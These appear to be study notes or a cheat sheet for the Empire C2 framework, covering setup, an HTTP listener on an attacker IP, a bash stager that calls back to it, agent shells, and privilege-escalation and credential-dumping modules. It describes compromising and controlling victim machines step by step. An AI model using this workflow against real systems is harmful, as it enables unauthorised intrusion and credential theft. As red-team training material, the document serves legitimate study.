# Empire - C2 Framework

Empire is a post-exploitation Command & Control (C2) framework that supports Windows, macOS, and Linux agents. It provides both a CLI and GUI interface for control.

You **can install the client** on a compromised system to pivot and manage internal operations from within a secured network.

---

## Installation

```bash
sudo apt install powershell-empire starkiller
````

---

## Starting Empire

### Empire Server

```bash
sudo powershell-empire server
```

### Empire CLI Client

```bash
powershell-empire client
```

If hosted locally, the client connects automatically.
If remote, either edit the config file:

```bash
/usr/share/powershell-empire/empire/client/config.yaml
```

Or use the manual connection command after launching the client:

```bash
connect HOSTNAME --username=USERNAME --password=PASSWORD
```

---

## Empire C2 Workflow – Steps Only

1. Start the Empire C2 server on your attack machine.

2. Launch the client interface (CLI or Starkiller GUI).

3. If using a remote server, connect to it with the correct credentials.

4. Create a listener (e.g., HTTP/S, TCP) to receive agent callbacks.

5. Generate a payload (stager) linked to the listener.

6. Deliver the payload to the target system using phishing, exploit, or another method.

7. Wait for the target system to execute the payload and connect back.

8. Monitor for new agent connections in the client interface.

9. Interact with the agent to run commands, collect data, or pivot further.

10. When finished, rename, kill, or manage agents as needed.

Other useful commands:

* `back` — return to agents menu
* `kill AGENT_NAME` — terminate the agent
* `rename AGENT_NAME NEW_NAME` — rename for clarity

---

### Component Summary

| Component        | Location        | Purpose                   |
| ---------------- | --------------- | ------------------------- |
| Empire Server    | Local or Remote | Backend, manages C2 logic |
| Client (CLI/GUI) | Local or Remote | Control interface         |
| Agent (Payload)  | On Victim       | Connects to listener      |
| Listener         | On Server       | Handles agent callbacks   |

---

## Listeners

A passive service on the Empire server that waits for incoming agent connections.

From the interactive CLI:

```bash
uselistener http
```

Set required options (case-sensitive):

```bash
set Name HCLI
set Host 10.50.82.226       # Attacker IP
set Port 8000               # Listening port
execute
```

Exit listener menu:

* `back` — go back
* `main` — return to main menu

Stop a listener:

```bash
kill LISTENER_NAME
```

Or use **Starkiller** for GUI control.

---

## Stagers

A lightweight payload that initiates a connection from the target to the listener, establishing an agent.

Create a payload using:

```bash
usestager multi/bash
set Listener HCLI
execute
```

This generates a Bash script. Deliver it to the target and run it.

> For in-terminal execution, remove the shebang (`#!/bin/bash`) and file deletion lines.

---

## Agents

A persistent session on a compromised machine that communicates with Empire and executes tasks.

To view and manage active sessions:

```bash
agents
```

Interact with an agent:

```bash
interact AGENT_NAME
```

Run commands:

* `shell` — get an interactive shell
* `shell COMMAND` — run a command directly
* `back` — exit agent interaction (agent remains active)
* `kill AGENT_NAME` — terminate agent session
* `rename AGENT_NAME NEW_NAME` — rename the agent

---

## Empire Modules

Empire provides post-exploitation modules that can be run on active agents for privilege escalation, reconnaissance, credential dumping, and more.

### Using a Module

1. Select a module (e.g., `powershell/privesc/sherlock`).
2. (Optional) Set the target agent if not already interacting.
3. Execute the module.
4. View the results in the CLI or in the **Reports** tab (if using Starkiller).

### Example: Sherlock (Privilege Escalation Check)

* Use the `powershell/privesc/sherlock` module.
* No need to set options if already in an agent context.
* Output is shown in terminal or Starkiller’s Report tab.

> **Note:** Modules vary by OS, agent type, and context. Always check compatibility before executing.

### Notes

* Listeners and agents are case-sensitive in commands.
* Use `options` in CLI to see configurable values.
* `Starkiller` is a powerful GUI tool — use it for easier visualization and management.
